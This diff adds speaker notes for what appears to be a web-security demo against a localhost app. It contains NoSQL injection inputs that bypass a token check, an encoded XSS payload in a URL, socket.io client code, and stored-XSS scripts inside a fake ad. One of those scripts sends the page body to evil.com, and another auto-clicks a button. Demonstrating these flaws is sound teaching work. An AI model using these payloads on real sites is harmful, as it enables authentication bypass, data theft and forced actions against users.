@@ -1,0 +1,40 @@
+demo: warmup
+
+http://localhost:3000/index.html
+token={'$gt': ''}
+
+http://localhost:3000/api/doc/1?token=XKCD7998
+http://localhost:3000/api/doc/1?token[$gt]
+http://localhost:3000/api/doc/1%3Cimg%20onerror=alert%2842%29%20src=x%3E?token=XKCD7998
+
+
+
+demo: socket
+
+ var s = io('', {
+      // Send auth token on connection
+      'query': 'token=',
+     path: '/socket.io-client'
+    });
+
+
+
+s.on("error", function (error) { console.warn('Socket error', error); });
+
+
+s.on("ad:save",function (item) {console.log(item)})
+
+demo: xss
+
+ws --log-format combined
+
+Chrome: 
+
+LOLCATS for sale!!<br>
+<img src="http://media.mnn.com/sites/default/files/user-8595/pw_1.jpg">
+<script>setTimeout("$('<img>').attr('src', '//evil.com:8000?s=' + encodeURIComponent(document.body.innerHTML))", 100)</script>
+
+
+LOLCATS for sale!!<br>
+<img src="http://media.mnn.com/sites/default/files/user-8595/pw_1.jpg">
+<script>setTimeout("$('.btn-primary').click()", 1)</script>
